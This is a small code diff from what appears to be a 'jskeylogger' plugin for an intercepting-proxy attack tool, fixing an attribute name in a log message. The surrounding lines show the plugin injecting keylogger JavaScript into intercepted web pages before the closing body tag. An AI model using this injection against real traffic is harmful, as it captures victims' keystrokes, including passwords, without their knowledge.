@@ -65,5 +65,5 @@ class jskeylogger(PluginTemplate):
         if self.isfilePath:
             with decoded(flow.response):
                 flow.response.content = flow.response.content.replace("</body>", "<script>" + self.content + "</script></body>")
-                self.send_output.emit('[{}] javascript keylogger injected..'.format(self.name))
+                self.send_output.emit('[{}] javascript keylogger injected..'.format(self.Name))
             
